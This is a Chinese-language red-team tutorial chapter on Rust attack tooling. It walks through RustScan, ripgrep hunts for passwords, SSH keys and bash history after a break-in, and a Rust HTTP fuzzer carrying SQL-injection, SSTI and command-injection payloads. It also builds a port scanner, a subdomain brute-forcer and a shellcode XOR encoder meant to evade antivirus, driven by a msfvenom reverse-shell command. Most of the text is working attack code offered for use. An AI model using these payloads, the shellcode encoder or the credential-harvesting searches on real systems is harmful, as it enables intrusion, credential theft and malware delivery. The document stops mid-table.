# 05 — Rust 红队工具链与系统入侵

> Rust 系统教程：[[../../rust/rust目录|Rust 教程总目录]] | [[../../路径F-Rust学习路径|Rust 学习路径]]

> 哲学：Rust 不是一门"未来"的语言——它已经来了。actix-web 是全球最快的 Web 框架之一，hyper 是底层 HTTP 引擎，tokio 是异步运行时的事实标准，surrealDB 是新锐数据库，Cloudflare 的整个边缘计算平台都在用 Rust 重写。越来越多的关键基础设施正在被 Rust 生态吞没。红队如果不懂 Rust，就永远比对手慢一步。
>
> 环境：Arch Linux，rustup 已安装，cargo 可用。
>
> 目标：不仅会跑 Rust 写的工具，还要能写 Rust 脚本来攻击 Rust 编写的系统，最后站在攻击者角度审视 Rust 供应链——让 Rust 生态本身成为你的武器库。


## Part 2: 用现成的 Rust 红队工具（上手即用）

### 实战 1：RustScan — 高速端口扫描

RustScan 自称「3 秒扫完 65535 个端口」——它不是吹牛。内部实现原理：

1. 创建 5000 个 TCP socket（可调）
2. 每批次 2000 个 socket 同时尝试 connect（可调）
3. 使用 `setsockopt SO_REUSEADDR` + 非阻塞 I/O 事件循环
4. 所有连接尝试在单个 epoll 循环中完成
5. 开放端口结果直接以 `-p80,443,8080` 格式输出，可管道传给 nmap 做服务识别

```bash
# 安装
sudo pacman -S rustscan
# 或者从源码安装
cargo install rustscan

# 基础用法：全端口扫描单目标
rustscan -a 192.168.56.102

# 指定端口范围 + 线程数 + 批次大小
rustscan -a 192.168.56.102 --range 1-65535 -t 5000 -b 2000

# 管道传给 nmap 做详细版本探测
rustscan -a 192.168.56.102 -- -sV -sC -oA /tmp/rustscan_result

# 扫描 /24 内网段
rustscan -a 192.168.56.0/24 -- -sV -oA /tmp/c段扫描

# 只输出开放端口（不做服务识别）
rustscan -a 10.0.0.1 -g | tee open_ports.txt

# 超时设置（目标响应慢时增大）
rustscan -a 192.168.1.100 -t 3000 --timeout 2000
```

**参数详解：**

| 参数 | 含义 | 默认值 | 何时调大/调小 |
|------|------|--------|---------------|
| `-a` | 目标地址 | 必填 | 支持 IP、域名、CIDR、逗号分隔 |
| `-t` | 线程数 | 4500 | 目标延迟高 → 降低；局域网 → 可以更高 |
| `-b` | 批次大小 | 4500 | 等于同时并发数，受文件描述符上限限制 |
| `-T` | 超时(毫秒) | 1500 | 慢速网络 → 加大到 3000-5000 |
| `--range` | 端口范围 | 1-65535 | 快速扫描常用端口：`1-1000,3306,8080,8443` |
| `-g` | greppable 输出 | — | 输出格式 `IP -> [端口1,端口2,...]` |
| `--scripts` | NSE 脚本 | — | 如 `--scripts "http-title,vulners"` |
| `--` | 之后传给 nmap | — | 所有 nmap 参数都可以加在这里 |

**预期输出示例（局域网扫描）：**

```bash
$ rustscan -a 192.168.56.102 -t 5000 -b 2000 -- -sV
 .----. .-. .-. .----..---. .----. .---. .--. .-. .-.
 | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
 | .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
 `-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
 --------------------------------------
 https://admin.tryhack.me

[~] The config file is expected to be at "/home/user/.config/rustscan/config.toml"
[~] Automatically increasing ulimit from 1024 to 5000.
Open 192.168.56.102:22
Open 192.168.56.102:80
Open 192.168.56.102:445
Open 192.168.56.102:3306
Open 192.168.56.102:8080
[~] Starting Script(s)
[~] Starting Nmap 7.94
Starting Nmap 7.94 ...
Nmap scan report for 192.168.56.102
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open http Apache httpd 2.4.18
445/tcp open netbios-ssn Samba smbd 3.X - 4.X
3306/tcp open mysql MySQL 5.7.33
8080/tcp open http Apache Tomcat 8.5.59
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**与 nmap 的配合策略：**

```bash
# 策略 1：RustScan 快速发现开放端口 → nmap 深度扫描（最常用）
rustscan -a 10.10.10.0/24 -b 3000 -- -sV -sC -oA c段深度扫描

# 策略 2：只对特定端口做服务识别
rustscan -a target.com --range 1-10000 -- -sV -p {{port}} -oN services.txt

# 策略 3：批量目标文件导入
while read ip; do
 rustscan -a "$ip" --range 1-10000 -- -sV -oN "nmap_${ip}.txt"
done < targets.txt

# 策略 4：UDP 端口扫描（RustScan 只支持 TCP，UDP 用 nmap）
rustscan -a target.com -- -sV -sC -oA tcp_results
nmap -sU -sV -p- -oA udp_results target.com # UDP 扫描单独跑
```

**RustScan 的局限和绕过：**

```
局限 1：只做 TCP connect() 扫描，不构造原始包
 → 通过内核 TCP 栈，每个连接产生完整的 TCP 握手
 → 比 SYN 半开扫描更容易被目标记录日志
 → 无法设置自定义源 IP（不能做 idle scan）

局限 2：不支持 UDP
 → 单独用 nmap -sU

局限 3：高并发时可能触发 IDS/IPS
 → 降低 -t 到 500，-b 到 200
 → 间隔 50ms 发包来模拟正常流量

局限 4：某些防火墙会直接丢包（而不是发 RST）
 → 增加 -T 超时值到 5000
 → 或使用 nmap 的 -Pn 跳过主机发现
```


### 实战 3：ripgrep (rg) — 红队信息收割神器

ripgrep 是用 Rust 写的 `grep` 替代品，快 10-30 倍。在红队工作中，它不只是文本搜索——它是在目标系统的文件海洋中快速定位敏感信息的核心工具。

```bash
# 安装
sudo pacman -S ripgrep

# === 密码搜索 ===

# 搜索所有包含 "password" 的文件（递归 + 忽略隐藏文件 + 智能文件类型过滤）
rg -i "password" /var/www/html/

# 只在特定类型文件中搜索
rg -i "password\|passwd\|pwd" --type html --type php --type js /var/www/

# 搜索 API 密钥模式（正则）
rg -i "api_?key\s*[:=]\s*['\"][^'\"]+['\"]" --type json --type yaml --type env .

# 搜索 JWT token 特征字符串
rg "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" .

# === 数据库连接串 ===

# 搜索各种数据库连接字符串
rg "mysql://|postgres://|postgresql://|mongodb://|redis://|sqlite://" .

# 搜索 JDBC 连接字符串
rg "jdbc:[a-z]+://[^/]+" --type java --type xml .

# 搜索 PHP 数据库配置
rg "\$db_(host|user|pass|name|password)\s*=" --type php /var/www/

# 搜索 Python 数据库配置
rg "(DATABASE_URL|DB_HOST|DB_PASSWORD|MONGO_URI)" --type py .

# === 密钥和证书 ===

# 搜索 SSH 私钥
rg -l "BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY" /

# 搜索 SSL 证书私钥
rg -l "BEGIN PRIVATE KEY" --type pem --type key /

# 搜索 .env 文件
fd -g ".env" . -x rg -i "(SECRET\|TOKEN\|KEY\|PASS)" {}

# === 注释中的敏感信息 ===

# 搜索 "临时" "测试" "硬编码" 等关键词
rg -i "(TODO|FIXME|HACK|XXX|TEMP|临时|测试|硬编码)" --type js --type py --type php .

# 搜索注释行中的敏感词（只要注释行）
rg "^[^a-zA-Z0-9]*//.*(password|secret|token)" --type js --type java .
rg "^[^a-zA-Z0-9]*#.*(password|secret|token)" --type py .

# === 内部端点发现 ===

# 搜索所有 API 路由定义
rg "(\.get\(|\.post\(|\.put\(|\.delete\(|@app\.|@route)" --type py --type js .
rg "route\s*[\(:].*['\"]" --type rs --type go .

# 搜索所有内网 IP
rg "\b(10\.\d{1,3}|172\.(1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b" .

# === 凭证文件定位 ===

# 查找所有配置文件
rg -l "(username|password|api_key|secret)\s*[:=]" --type yaml --type toml --type json --type env .

# 批量处理：找到文件后提取匹配行
rg -l "password" . | xargs rg "password" -n

# 上下文查看（前后各 3 行）
rg -C 3 "password" . --type php
```

**ripgrep 红队专用参数组合：**

```bash
# 搜索速度优化
rg -i -n --no-heading --color=never "pattern" . # 纯文本输出，适合管道
rg -i -l "pattern" . # 只输出文件名
rg -i -c "pattern" . # 统计每个文件匹配数
rg -i --json "pattern" . # JSON 输出，便于脚本解析

# 文件过滤
rg --type-list # 列出所有支持的文件类型
rg -t py -t js -t rs -t go "pattern" . # 只搜索特定类型
rg -T lock "pattern" . # 排除 Cargo.lock/package-lock.json 等
rg -g "*.{conf,cfg,ini}" "pattern" . # glob 模式过滤

# 搜索控制
rg --max-depth 3 "pattern" . # 限制目录深度
rg --max-filesize 10M "pattern" . # 忽略大文件
rg -m 5 "pattern" . # 每个文件最多匹配 5 行
rg --no-ignore "pattern" . # 不忽略 .gitignore 规则
rg -u "pattern" . # 搜索所有文件包括隐藏文件

# 多行搜索
rg -U "user.*\n.*pass" . # 多行模式

# 反向匹配
rg -v "200 OK" access.log # 显示非 200 响应
```

**实战场景：攻破一个 Web 服务器后，用 rg 做后渗透信息收割：**

```bash
# 1. 快速定位所有配置文件
rg -l "(password|secret|key|token|credential)" /var/www/ 2>/dev/null

# 2. 搜索数据库备份文件中的凭证
rg -i "INSERT INTO.*users" --type sql /var/backups/

# 3. 搜索 SSH 配置中的跳板机信息
rg "(HostName|User|Port)\s" ~/.ssh/config

# 4. 搜索 bash 历史中的密码
rg "(passwd|mysql|psql|ssh|token)" ~/.bash_history

# 5. 搜索所有可写目录
find / -writable -type d 2>/dev/null | xargs -I {} rg -l "writable" {} 2>/dev/null
```


### 实战 4.5: 其他 Rust 红队工具速通

```bash
# ======== x8: HTTP 参数发现（类似 arjun）========
# 安装
cargo install x8

# 基础用法：自动发现 GET/POST 参数
x8 -u http://target.com/page.php -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# 测试参数是否有效
x8 -u http://target.com/api/endpoint -X POST -w /usr/share/wordlists/params.txt

# 多目标批量扫描
cat urls.txt | xargs -I {} x8 -u {} -w /usr/share/wordlists/params.txt

# ======== subxtract: 子域名枚举 ========
# 安装
cargo install subxtract

# 基础子域名爆破
subxtract -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 输出到文件
subxtract -d target.com -w /usr/share/seclists/Discovery/DNS/namelist.txt -o subs.txt

# 解析 IP + 保存
subxtract -d target.com -w /usr/share/wordlists/subdomains.txt -r -o resolved_subs.txt

# ======== httpx (Go写的但值得装，Rust有替代rustscan-parse) ========
# rustscan 扫描后提取 HTTP 服务
rustscan -a 192.168.56.0/24 -g | awk -F'->' '{print $2}' | tr -d '[]' | tr ',' '\n' | grep -E '(80|443|8080|8443|3000|8000)'

# ======== tokei: 代码统计（红队侦察用）========
# 快速了解目标代码库组成
cargo install tokei
tokei /var/www/html/ # 看用了哪些语言、代码量
# 输出示例：
# PHP 45 files 12500 lines
# JavaScript 23 files 8900 lines
# Rust 12 files 3400 lines ← 关键！得知目标有 Rust 组件

# ======== bat: cat 替代带语法高亮（方便审计代码）========
sudo pacman -S bat
bat wp-config.php # 比 cat 好 100 倍
bat --show-all nginx.conf # 显示所有隐藏字符
```


### 实战 6：对 Rust 后端做 fuzz 测试

```bash
# === 安装 Rust fuzzing 工具链 ===

# cargo-fuzz (libfuzzer 绑定)
cargo install cargo-fuzz

# afl.rs (AFL 的 Rust 绑定)
cargo install afl

# honggfuzz
cargo install honggfuzz

# === 写一个针对 Rust HTTP API 的 fuzzer ===

# 创建项目
cargo new http_fuzzer && cd http_fuzzer
```

在 `Cargo.toml` 中添加依赖：

```toml
[package]
name = "http_fuzzer"
version = "0.1.0"
edition = "2021"

[dependencies]
reqwest = { version = "0.12", features = ["json"] }
tokio = { version = "1", features = ["full"] }
rand = "0.8"
serde_json = "1"
```

`src/main.rs` — 针对式 HTTP fuzzer：

```rust
use rand::Rng;
use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;

const FUZZ_PAYLOADS: &[&str] = &[
 "", // 空
 "A", // 单字符
 "%00", // null byte
 "%0d%0a", // CRLF
 "../../../../etc/passwd", // 路径遍历
 "' OR '1'='1", // SQL 注入
 "<script>alert(1)</script>", // XSS
 "${7*7}", // SSTI 测试
 "{{7*7}}", // Jinja2 SSTI
 "$(whoami)", // 命令注入
 "`whoami`", // 命令注入 2
 "&whoami&", // 命令注入 3
 "|whoami", // 命令注入 4
 "1 AND 1=1", // SQL 盲注
 "1' AND '1'='1", // SQL 注入变体
 "{\"$gt\":\"\"}", // NoSQL 注入
 "__proto__", // 原型污染
 "constructor", // 原型污染 2
 "Infinity", // JSON 非标准值
 "NaN", // JSON 非标准值 2
 "-1e10000", // 超大浮点
];

async fn fuzz_endpoint(client: &Client, base_url: &str, endpoint: &str) {
 let mut rng = rand::thread_rng();

 for payload in FUZZ_PAYLOADS {
 // 测试 GET 请求（查询参数）
 let url = format!("{}{}?input={}", base_url, endpoint, payload);
 match client.get(&url).timeout(Duration::from_secs(5)).send().await {
 Ok(resp) => {
 let status = resp.status();
 if status.as_u16() == 500 {
 let body = resp.text().await.unwrap_or_default();
 if body.len() < 2000 {
 println!("[!!!] 500 错误! URL: {} | 响应: {}", url, &body[..body.len().min(200)]);
 } else {
 println!("[!!!] 500 错误! URL: {} | 响应体过大({} bytes)", url, body.len());
 }
 } else if status.as_u16() >= 200 && status.as_u16() < 400 {
 println!("[.] {} → {} (OK)", url, status);
 } else {
 println!("[?] {} → {} (异常)", url, status);
 }
 }
 Err(e) => {
 if e.is_timeout() {
 println!("[!!!] 超时! URL: {} (可能是 DoS)", url);
 } else if e.is_connect() {
 println!("[!!!] 连接断开! URL: {} (可能是 panic/crash)", url);
 } else {
 println!("[!] 请求失败: {} - {}", url, e);
 }
 }
 }

 // 测试 POST 请求（JSON body）
 let json_body = serde_json::json!({
 "data": payload,
 "nested": {
 "value": payload
 }
 });
 match client.post(&format!("{}{}", base_url, endpoint))
 .json(&json_body)
 .timeout(Duration::from_secs(5))
 .send().await
 {
 Ok(resp) => {
 let status = resp.status();
 if status.as_u16() == 500 {
 println!("[!!!] POST 500 错误! {} | payload={}", endpoint, payload);
 }
 }
 Err(e) => {
 if e.is_timeout() || e.is_connect() {
 println!("[!!!] POST 连接问题! {} | payload={} | err={}", endpoint, payload, e);
 }
 }
 }

 // 随机延迟防止触发 WAF
 let delay = rng.gen_range(50..300);
 sleep(Duration::from_millis(delay)).await;
 }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
 let args: Vec<String> = std::env::args().collect();
 if args.len() < 2 {
 eprintln!("用法: {} <目标URL>", args[0]);
 eprintln!("示例: {} http://192.168.56.102", args[0]);
 std::process::exit(1);
 }

 let base_url = args[1].trim_end_matches('/').to_string();

 let client = Client::builder()
 .danger_accept_invalid_certs(true)
 .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 .build()?;

 let endpoints = vec![
 "/api/users",
 "/api/login",
 "/api/search",
 "/api/upload",
 "/api/data",
 "/query",
 "/search",
 "/login",
 "/register",
 "/profile",
 ];

 println!("[*] 开始对 {} 进行 fuzz 测试", base_url);
 println!("[*] 测试端点: {:?}", endpoints);
 println!("[*] 总 payload 数: {} × {} = {}\n", FUZZ_PAYLOADS.len(), endpoints.len(), FUZZ_PAYLOADS.len() * endpoints.len());

 for endpoint in &endpoints {
 fuzz_endpoint(&client, &base_url, endpoint).await;
 }

 println!("\n[*] Fuzz 完成");
 Ok(())
}
```

运行：

```bash
cargo build --release
./target/release/http_fuzzer http://192.168.56.102:8080
```

**预期输出：**

```
[*] 开始对 http://192.168.56.102:8080 进行 fuzz 测试
[*] 测试端点: ["/api/users", "/api/login", "/api/search", ...]
[*] 总 payload 数: 21 × 10 = 210

[.] http://192.168.56.102:8080/api/users?input= → 200 OK (OK)
[?] http://192.168.56.102:8080/api/users?input=%00 → 400 Bad Request (异常)
[!!!] 500 错误! URL: http://192.168.56.102:8080/api/search?input=' OR '1'='1 | 响应: {"error":"Internal Server Error","cause":"SQLx query failed: ..."}
[!!!] 超时! URL: http://192.168.56.102:8080/api/data?input=../../../../etc/passwd (可能是 DoS)
[!!!] 连接断开! URL: http://192.168.56.102:8080/api/upload?input=%0d%0a (可能是 panic/crash)
```


## Part 4: 自己写 Rust 红队脚本

### 实战 8：Rust 高速端口扫描器（tokio 异步版）

```bash
cargo new rust_port_scanner && cd rust_port_scanner
```

`Cargo.toml`:

```toml
[package]
name = "rust_port_scanner"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1", features = ["full"] }
clap = { version = "4", features = ["derive"] }
colored = "2"
```

`src/main.rs`:

```rust
use clap::Parser;
use colored::*;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::timeout;

#[derive(Parser, Debug)]
#[command(name = "rust_port_scanner")]
#[command(about = "高性能异步 TCP 端口扫描器", version = "0.1")]
struct Args {
 /// 目标 IP 地址
 #[arg(short, long)]
 target: String,

 /// 起始端口
 #[arg(short, long, default_value = "1")]
 start: u16,

 /// 结束端口
 #[arg(short = 'e', long, default_value = "65535")]
 end: u16,

 /// 最大并发连接数
 #[arg(short, long, default_value = "1000")]
 concurrency: usize,

 /// 连接超时（毫秒）
 #[arg(short = 'T', long, default_value = "1000")]
 timeout_ms: u64,

 /// 是否显示关闭的端口
 #[arg(short = 'v', long)]
 verbose: bool,
}

async fn scan_port(target: &str, port: u16, timeout_dur: Duration) -> (u16, bool) {
 let addr = format!("{}:{}", target, port);
 match timeout(timeout_dur, TcpStream::connect(&addr)).await {
 Ok(Ok(_stream)) => (port, true),
 _ => (port, false),
 }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
 let args = Args::parse();
 let timeout_dur = Duration::from_millis(args.timeout_ms);
 let semaphore = Arc::new(Semaphore::new(args.concurrency));
 let target = Arc::new(args.target.clone());

 println!(
 "{} {} {} [{} -> {}]",
 "[*]".blue().bold(),
 "扫描目标:".white(),
 target.white().bold(),
 args.start,
 args.end
 );
 println!(
 "{} 并发: {} | 超时: {}ms",
 "[*]".blue().bold(),
 args.concurrency,
 args.timeout_ms
 );

 let start_time = std::time::Instant::now();
 let mut handles = Vec::new();

 for port in args.start..=args.end {
 let permit = semaphore.clone().acquire_owned().await;
 let target = target.clone();

 handles.push(tokio::spawn(async move {
 let _permit = permit;
 scan_port(&target, port, timeout_dur).await
 }));
 }

 let mut open_ports: Vec<u16> = Vec::new();
 let mut closed_count = 0;

 for handle in handles {
 match handle.await {
 Ok((port, true)) => {
 println!("{} {}:{} {}", "[+]".green().bold(), *target, port, "开放".green());
 open_ports.push(port);
 }
 Ok((port, false)) => {
 if args.verbose {
 println!("{} {}:{} {}", "[-]".red(), *target, port, "关闭".red());
 }
 closed_count += 1;
 }
 Err(e) => {
 eprintln!("{} 任务失败: {}", "[!]".yellow().bold(), e);
 }
 }
 }

 let elapsed = start_time.elapsed();
 let total = args.end - args.start + 1;

 println!("\n{}", "=".repeat(50));
 println!(
 "{} 扫描完成: {:.2}s",
 "[*]".blue().bold(),
 elapsed.as_secs_f64()
 );
 println!(
 "{} 总计: {} 端口 | {} 开放 | {} 关闭",
 "[*]".blue().bold(),
 total,
 format!("{}", open_ports.len()).green().bold(),
 closed_count
 );

 if !open_ports.is_empty() {
 println!(
 "{} 开放端口: {}",
 "[+]".green().bold(),
 open_ports
 .iter()
 .map(|p| p.to_string())
 .collect::<Vec<_>>()
 .join(", ")
 );
 }

 Ok(())
}
```

编译运行：

```bash
cargo build --release
./target/release/rust_port_scanner -t 192.168.56.102 -s 1 -e 1000 -c 500
```

**预期输出：**

```
[*] 扫描目标: 192.168.56.102 [1 -> 1000]
[*] 并发: 500 | 超时: 1000ms
[+] 192.168.56.102:22 开放
[+] 192.168.56.102:80 开放
[+] 192.168.56.102:443 开放
[+] 192.168.56.102:445 开放
[+] 192.168.56.102:3306 开放
[+] 192.168.56.102:8080 开放

[*] 扫描完成: 2.34s
[*] 总计: 1000 端口 | 6 开放 | 994 关闭
[+] 开放端口: 22, 80, 443, 445, 3306, 8080
```


### 实战 10：Rust DNS 子域名爆破器（并发 UDP）

```bash
cargo new rust_subdomain_brute && cd rust_subdomain_brute
```

`Cargo.toml`:

```toml
[package]
name = "rust_subdomain_brute"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1", features = ["full"] }
clap = { version = "4", features = ["derive"] }
colored = "2"
trust-dns-resolver = "0.23"
```

`src/main.rs`:

```rust
use clap::Parser;
use colored::*;
use std::fs;
use std::sync::Arc;
use std::time::Instant;
use tokio::sync::Semaphore;
use trust_dns_resolver::config::{ResolverConfig, ResolverOpts};
use trust_dns_resolver::TokioAsyncResolver;

#[derive(Parser, Debug)]
#[command(name = "rust_subdomain_brute")]
struct Args {
 /// 目标域名
 #[arg(short, long)]
 domain: String,

 /// 子域名字典文件
 #[arg(short, long)]
 wordlist: String,

 /// 并发数
 #[arg(short, long, default_value = "200")]
 concurrency: usize,

 /// 自定义 DNS 服务器
 #[arg(short = 'd', long)]
 dns_server: Option<String>,

 /// 输出文件
 #[arg(short, long)]
 output: Option<String>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
 let args = Args::parse();

 let wordlist_content = fs::read_to_string(&args.wordlist)?;
 let subdomains: Vec<&str> = wordlist_content
 .lines()
 .map(|l| l.trim())
 .filter(|l| !l.is_empty() && !l.starts_with('#'))
 .collect();

 // 构建解析器
 let resolver = if let Some(ref dns_ip) = args.dns_server {
 let mut config = ResolverConfig::default();
 let mut opts = ResolverOpts::default();
 opts.timeout = std::time::Duration::from_secs(3);
 opts.attempts = 1;

 let ns_group = trust_dns_resolver::config::NameServerConfigGroup::from_ips_clear(
 &[dns_ip.parse()?],
 53,
 true,
 );
 config = ResolverConfig::from_parts(None, vec![], ns_group);
 TokioAsyncResolver::tokio(config, opts)?
 } else {
 let mut opts = ResolverOpts::default();
 opts.timeout = std::time::Duration::from_secs(3);
 opts.attempts = 1;
 TokioAsyncResolver::tokio(ResolverConfig::default(), opts)?
 };

 let semaphore = Arc::new(Semaphore::new(args.concurrency));
 let domain = Arc::new(args.domain.clone());

 println!(
 "{} 目标域名: {} | 字典条目: {}",
 "[*]".blue().bold(),
 domain.white().bold(),
 subdomains.len()
 );
 println!(
 "{} 并发: {} | DNS: {}",
 "[*]".blue().bold(),
 args.concurrency,
 args.dns_server.as_deref().unwrap_or("系统默认")
 );
 println!();

 let start = Instant::now();
 let mut handles = Vec::new();

 for &sub in &subdomains {
 let permit = semaphore.clone().acquire_owned().await;
 let resolver = resolver.clone();
 let domain = domain.clone();
 let sub_owned = sub.to_string();

 handles.push(tokio::spawn(async move {
 let _permit = permit;
 let fqdn = format!("{}.{}", sub_owned, domain);

 match resolver.lookup_ip(&fqdn).await {
 Ok(lookup) => {
 let ips: Vec<String> = lookup.iter().map(|ip| ip.to_string()).collect();
 Some((fqdn, ips))
 }
 Err(_) => None,
 }
 }));
 }

 let mut found = Vec::new();
 for handle in handles {
 match handle.await {
 Ok(Some((fqdn, ips))) => {
 println!(
 "{} {} -> {}",
 "[+]".green().bold(),
 fqdn.green(),
 ips.join(", ").yellow()
 );
 found.push((fqdn, ips));
 }
 Ok(None) => {}
 Err(e) => {
 eprintln!("{} 任务异常: {}", "[!]".red(), e);
 }
 }
 }

 let elapsed = start.elapsed();

 if let Some(ref output_path) = args.output {
 let mut output_content = String::new();
 for (fqdn, ips) in &found {
 output_content.push_str(&format!("{} -> {}\n", fqdn, ips.join(", ")));
 }
 fs::write(output_path, output_content)?;
 println!("\n{} 结果已保存到: {}", "[*]".blue(), output_path);
 }

 println!("\n{}", "=".repeat(50));
 println!(
 "{} 扫描完成: {:.2}s | 发现 {} 个子域名",
 "[*]".blue().bold(),
 elapsed.as_secs_f64(),
 format!("{}", found.len()).green().bold()
 );

 Ok(())
}
```

运行：

```bash
# 用系统 DNS
cargo run --release -- -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o found_subs.txt

# 用指定 DNS（如 8.8.8.8）
cargo run --release -- -d target.com -w /usr/share/seclists/Discovery/DNS/namelist.txt -d 8.8.8.8 -c 500
```


### 实战 12：Shellcode 编码/混淆生成器

```bash
cargo new shellcode_encoder && cd shellcode_encoder
```

`Cargo.toml`:

```toml
[package]
name = "shellcode_encoder"
version = "0.1.0"
edition = "2021"

[dependencies]
clap = { version = "4", features = ["derive"] }
base64 = "0.22"
rand = "0.8"
```

`src/main.rs`:

```rust
use base64::Engine;
use clap::Parser;
use rand::Rng;
use std::fs;

#[derive(Parser, Debug)]
#[command(name = "shellcode_encoder")]
struct Args {
 /// Shellcode 原始文件（二进制）
 #[arg(short, long)]
 input: String,

 /// 输出格式: hex, c, python, ps1, b64, rust
 #[arg(short, long, default_value = "hex")]
 format: String,

 /// XOR 密钥（单字节，0x00-0xFF，0 表示不 XOR）
 #[arg(short, long, default_value = "0")]
 xor_key: u8,

 /// 随机 XOR 密钥
 #[arg(short = 'r', long)]
 random_xor: bool,

 /// 分块大小（对 shellcode 做分段避免检测）
 #[arg(short, long, default_value = "0")]
 chunk_size: usize,

 /// 变量名（C/Rust/PowerShell 格式用）
 #[arg(short = 'n', long, default_value = "shellcode")]
 var_name: String,
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
 let mut args = Args::parse();
 let raw = fs::read(&args.input)?;
 let original_len = raw.len();

 if args.random_xor {
 args.xor_key = rand::thread_rng().gen_range(1..=255);
 }

 // XOR 编码
 let processed: Vec<u8> = if args.xor_key != 0 {
 raw.iter().map(|b| b ^ args.xor_key).collect()
 } else {
 raw.clone()
 };

 // 分块（可选）
 let chunks: Vec<&[u8]> = if args.chunk_size > 0 {
 processed.chunks(args.chunk_size).collect()
 } else {
 vec![&processed[..]]
 };

 println!("/*");
 println!(" * Shellcode Encoder - Red Team Tool");
 println!(" * 原始大小: {} bytes", original_len);
 if args.xor_key != 0 {
 println!(" * XOR 密钥: 0x{:02X}", args.xor_key);
 }
 if args.chunk_size > 0 {
 println!(" * 分块大小: {} bytes (共 {} 块)", args.chunk_size, chunks.len());
 }
 println!(" */\n");

 match args.format.as_str() {
 "hex" => {
 println!("{}", hex_format(&processed));
 }
 "c" => {
 println!("{}", c_format(&processed, &args.var_name));
 }
 "python" => {
 println!("{}", python_format(&processed, &args.var_name, args.xor_key));
 }
 "ps1" | "powershell" => {
 println!("{}", ps1_format(&processed, &args.var_name, args.xor_key));
 }
 "b64" | "base64" => {
 let b64 = base64::engine::general_purpose::STANDARD.encode(&processed);
 println!("{}", b64);
 }
 "rust" => {
 println!("{}", rust_format(&processed, &args.var_name));
 }
 _ => {
 eprintln!("不支持的格式: {}", args.format);
 eprintln!("支持: hex, c, python, ps1, b64, rust");
 std::process::exit(1);
 }
 }

 Ok(())
}

fn hex_format(data: &[u8]) -> String {
 data.iter()
 .map(|b| format!("{:02x}", b))
 .collect::<Vec<_>>()
 .join("")
}

fn c_format(data: &[u8], var_name: &str) -> String {
 let mut output = format!(
 "// C/C++ Shellcode - XOR Key: (manual)\n"
 );
 output.push_str(&format!(
 "unsigned char {}[] = {{\n ",
 var_name
 ));

 for (i, byte) in data.iter().enumerate() {
 if i > 0 {
 output.push_str(", ");
 }
 if i % 16 == 0 && i > 0 {
 output.push_str("\n ");
 }
 output.push_str(&format!("0x{:02x}", byte));
 }
 output.push_str(&format!("\n}};\nunsigned int {}_len = {};\n", var_name, data.len()));
 output
}

fn python_format(data: &[u8], var_name: &str, xor_key: u8) -> String {
 let hex_str = hex_format(data);
 let mut output = format!("# Python3 Shellcode\n");

 if xor_key != 0 {
 output.push_str(&format!("# XOR Key: 0x{:02X}\n\n", xor_key));
 output.push_str(&format!(
 "{} = bytes.fromhex('{}')\n",
 var_name, hex_str
 ));
 output.push_str(&format!(
 "{}_decoded = bytes([b ^ 0x{:02X} for b in {}])\n",
 var_name, xor_key, var_name
 ));
 } else {
 output.push_str(&format!(
 "{} = bytes.fromhex('{}')\n",
 var_name, hex_str
 ));
 }
 output
}

fn ps1_format(data: &[u8], var_name: &str, xor_key: u8) -> String {
 let b64 = base64::engine::general_purpose::STANDARD.encode(data);
 let mut output = format!("# PowerShell Shellcode\n\n");

 if xor_key != 0 {
 output.push_str(&format!("$xorKey = 0x{:02X}\n", xor_key));
 output.push_str(&format!(
 "[Byte[]] ${} = [System.Convert]::FromBase64String('{}') | ForEach-Object {{ $_ -bxor $xorKey }}\n",
 var_name, b64
 ));
 } else {
 output.push_str(&format!(
 "[Byte[]] ${} = [System.Convert]::FromBase64String('{}')\n",
 var_name, b64
 ));
 }
 output
}

fn rust_format(data: &[u8], var_name: &str) -> String {
 let mut output = format!("// Rust Shellcode\n\n");
 output.push_str(&format!(
 "let {}: [u8; {}] = [\n ",
 var_name,
 data.len()
 ));

 for (i, byte) in data.iter().enumerate() {
 if i > 0 {
 output.push_str(", ");
 }
 if i % 16 == 0 && i > 0 {
 output.push_str("\n ");
 }
 output.push_str(&format!("0x{:02x}", byte));
 }
 output.push_str(&format!("\n];\n"));
 output
}
```

运行：

```bash
# 生成 msfvenom shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f raw -o shellcode.bin

# Hex 格式输出
cargo run --release -- -i shellcode.bin -f hex

# C 语言格式
cargo run --release -- -i shellcode.bin -f c -n sc

# Python 格式 + XOR 编码
cargo run --release -- -i shellcode.bin -f python -x 0x55 -n payload

# PowerShell 格式 + 随机 XOR
cargo run --release -- -i shellcode.bin -f ps1 -r -n shellcode

# Base64 输出
cargo run --release -- -i shellcode.bin -f b64

# Rust 格式
cargo run --release -- -i shellcode.bin -f rust -n SHELLCODE

# 分块输出（绕过 AV 扫描）
cargo run --release -- -i shellcode.bin -f c -n sc --chunk-size 16
```


## Part 6: 扩展与总结

### Rust 红队工具速查表

| 工具 | 用途 | 安装命令 | 核心用法 |
|------|------|----------|----------|
